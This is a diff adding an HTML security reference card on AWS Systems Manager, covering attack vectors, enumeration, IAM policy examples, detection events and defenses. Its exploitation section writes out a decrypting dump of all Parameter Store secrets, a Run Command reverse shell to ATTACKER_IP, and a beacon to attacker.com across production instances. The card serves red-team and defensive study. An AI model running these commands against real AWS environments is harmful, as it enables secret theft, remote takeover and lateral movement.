@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS Systems Manager Security | AWS Security Cards</title>
+<meta name="description" content="Systems Manager (SSM) provides operational management for EC2 and on-premises servers. Parameter Store holds secrets, Run Command enables remote execution, Session Manager provides shell access.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #64748b15, #0a0e1a, #47556915);
+    border: 1px solid #64748b4d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #64748b0d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #64748b33;
+    color: #64748b;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #64748b4d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/ssm-card.webp" alt="AWS Systems Manager Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/ssm.svg" alt="AWS Systems Manager Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS Systems Manager Security</span>
+        <span class="header-badge">MANAGEMENT</span>
+      </div>
+      <p class="header-desc">Systems Manager (SSM) provides operational management for EC2 and on-premises servers. Parameter Store holds secrets, Run Command enables remote execution, Session Manager provides shell access.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Risk Level</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">RCE</div>
+          <div class="stat-label">Run Command</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">Secrets</div>
+          <div class="stat-label">Parameter Store</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">Shell</div>
+          <div class="stat-label">Session Manager</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#64748b;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #64748b;">Parameter Store</h4>
+          <p>Hierarchical storage for configuration and secrets. Supports SecureString (KMS encrypted), String, and StringList types. Often contains database passwords, API keys, certificates.</p>
+          
+        </div>
+        <div>
+          <h4 style="color: #64748b;">Run Command</h4>
+          <p>Execute commands on managed instances without SSH. Uses SSM Agent. Can run shell scripts, PowerShell, Python. Perfect for lateral movement and remote code execution.</p>
+          
+        </div>
+        <div>
+          <h4 style="color: #64748b;">Session Manager</h4>
+          <p>Interactive shell access to instances without SSH keys or bastion hosts. Sessions logged to S3/CloudWatch. No inbound ports required - uses HTTPS.</p>
+          
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 85%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.5</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">SSM provides remote code execution, secret storage, and shell access. Compromising SSM permissions often leads to full instance compromise and lateral movement across the fleet.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Parameter Store</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate all parameters for secrets</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Decrypt SecureString parameters</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Modify parameters to inject backdoors</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Access parameters via EC2 instance role</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> History reveals old secret values</li></ul><h4 style="color: #f87171;">Run Command &amp; Session Manager</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute arbitrary commands on instances</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Reverse shell via Run Command</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Session Manager for interactive access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Pivot through managed instances</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Execute across all tagged instances</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Parameter Store Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Secrets stored as String (not SecureString)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive parameter policies</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing KMS encryption</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Wildcard parameter paths in IAM</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No parameter versioning/history cleanup</li></ul><h4 style="color: #fb923c;">Run Command Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> ssm:SendCommand with Resource: *</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No instance tag restrictions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Session Manager without logging</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing session encryption</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No approval workflow for commands</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Parameters</div>
+          <pre><code>aws ssm describe-parameters</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Parameter Value</div>
+          <pre><code>aws ssm get-parameter --name /app/db/password --with-decryption</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Get Parameters by Path</div>
+          <pre><code>aws ssm get-parameters-by-path --path /app/ --recursive --with-decryption</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Managed Instances</div>
+          <pre><code>aws ssm describe-instance-information</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Documents</div>
+          <pre><code>aws ssm list-documents --document-filter-list key=Owner,value=Self</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">💻 Remote Code Execution</h3><h4 style="color: #c084fc;">Run Command</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AWS-RunShellScript for Linux</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> AWS-RunPowerShellScript for Windows</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Target by instance ID, tag, or resource group</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Output stored in S3 or CloudWatch</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Async execution with status tracking</li></ul><h4 style="color: #c084fc;">Session Manager</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Interactive shell without SSH</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Port forwarding through SSM</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Start session from console or CLI</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Session recorded to S3/CloudWatch</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Works through NAT, no inbound rules</li></ul><div class="note"><strong>Red Team:</strong> Run Command is often the fastest path to RCE once you have ssm:SendCommand permission.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔄 Lateral Movement</h3><h4 style="color: #facc15;">Via SSM</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Execute on all instances with matching tags</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Steal credentials from instance metadata</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Read application configs with secrets</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Pivot to on-premises hybrid instances</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access instances in private subnets</li></ul><h4 style="color: #facc15;">Credential Harvesting</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Dump Parameter Store secrets</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Extract .env files from instances</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Read AWS credentials from disk</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Access application database configs</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Steal SSH keys from instances</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GetParameter/GetParameters - secret access</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> SendCommand - remote execution</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> StartSession - interactive session</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PutParameter - parameter modification</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateDocument - custom document</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk parameter enumeration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Commands to multiple instances</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Unusual Session Manager usage</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Parameter access from new principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Reverse shell patterns in commands</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Dump All Parameters</div>
+          <pre><code>aws ssm get-parameters-by-path \\
+  --path &quot;/&quot; \\
+  --recursive \\
+  --with-decryption \\
+  --query 'Parameters[*].[Name,Value]' \\
+  --output table</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Execute Command on Instance</div>
+          <pre><code>aws ssm send-command \\
+  --instance-ids i-1234567890abcdef0 \\
+  --document-name &quot;AWS-RunShellScript&quot; \\
+  --parameters 'commands=[&quot;whoami&quot;,&quot;id&quot;,&quot;cat /etc/passwd&quot;]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Reverse Shell via Run Command</div>
+          <pre><code>aws ssm send-command \\
+  --instance-ids i-1234567890abcdef0 \\
+  --document-name &quot;AWS-RunShellScript&quot; \\
+  --parameters 'commands=[&quot;bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1&quot;]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Start Session Manager</div>
+          <pre><code>aws ssm start-session --target i-1234567890abcdef0</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Execute on Tagged Instances</div>
+          <pre><code>aws ssm send-command \\
+  --targets &quot;Key=tag:Environment,Values=Production&quot; \\
+  --document-name &quot;AWS-RunShellScript&quot; \\
+  --parameters 'commands=[&quot;curl http://attacker.com/beacon&quot;]'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Port Forward via Session Manager</div>
+          <pre><code>aws ssm start-session \\
+  --target i-1234567890abcdef0 \\
+  --document-name AWS-StartPortForwardingSession \\
+  --parameters '{&quot;portNumber&quot;:[&quot;3389&quot;],&quot;localPortNumber&quot;:[&quot;13389&quot;]}'</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Overly Permissive - Full SSM Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;ssm:*&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Allows reading all secrets, executing commands on any instance, and full management</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Scoped Parameter Access</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: [&quot;ssm:GetParameter&quot;, &quot;ssm:GetParameters&quot;],
+    &quot;Resource&quot;: &quot;arn:aws:ssm:*:*:parameter/app/myapp/*&quot;,
+    &quot;Condition&quot;: {
+      &quot;StringEquals&quot;: {
+        &quot;aws:ResourceTag/team&quot;: &quot;myteam&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Only allows access to parameters under specific path with tag restriction</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Wildcard SendCommand</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;ssm:SendCommand&quot;,
+    &quot;Resource&quot;: &quot;*&quot;
+  }]
+}</code></pre>
+          <p class="policy-desc">Can execute commands on ANY managed instance - critical RCE risk</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Restricted Run Command</span>
+          </div>
+          <pre><code>{
+  &quot;Version&quot;: &quot;2012-10-17&quot;,
+  &quot;Statement&quot;: [{
+    &quot;Effect&quot;: &quot;Allow&quot;,
+    &quot;Action&quot;: &quot;ssm:SendCommand&quot;,
+    &quot;Resource&quot;: [
+      &quot;arn:aws:ec2:*:*:instance/*&quot;,
+      &quot;arn:aws:ssm:*::document/AWS-RunShellScript&quot;
+    ],
+    &quot;Condition&quot;: {
+      &quot;StringEquals&quot;: {
+        &quot;ssm:resourceTag/Environment&quot;: &quot;Development&quot;
+      }
+    }
+  }]
+}</code></pre>
+          <p class="policy-desc">Restricts command execution to Dev instances only</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Use SecureString for Secrets</h4>
+              <p>Always encrypt sensitive parameters with KMS SecureString type.</p>
+              <pre><code>aws ssm put-parameter \\
+  --name &quot;/app/db/password&quot; \\
+  --value &quot;secret123&quot; \\
+  --type SecureString \\
+  --key-id alias/my-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📝</span>
+            <div>
+              <h4>Enable Session Manager Logging</h4>
+              <p>Log all sessions to S3 and CloudWatch for audit trail.</p>
+              <pre><code># In Session Manager preferences
+{
+  &quot;s3BucketName&quot;: &quot;session-logs&quot;,
+  &quot;cloudWatchLogGroupName&quot;: &quot;/aws/ssm/sessions&quot;
+}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🏷️</span>
+            <div>
+              <h4>Use Tag-Based Access Control</h4>
+              <p>Restrict SendCommand and StartSession to specific instance tags.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Restrict Parameter Paths</h4>
+              <p>Use hierarchical parameter paths and grant access to specific paths only.</p>
+              
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Limit Document Usage</h4>
+              <p>Restrict which SSM documents can be used for commands.</p>
+              <pre><code>&quot;Condition&quot;: {
+  &quot;StringEquals&quot;: {
+    &quot;ssm:DocumentName&quot;: [
+      &quot;AWS-RunPatchBaseline&quot;,
+      &quot;Custom-ApprovedScript&quot;
+    ]
+  }
+}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">⏰</span>
+            <div>
+              <h4>Use Run Command Approvals</h4>
+              <p>Require manual approval for sensitive command execution via Automation.</p>
+              
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS Systems Manager Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
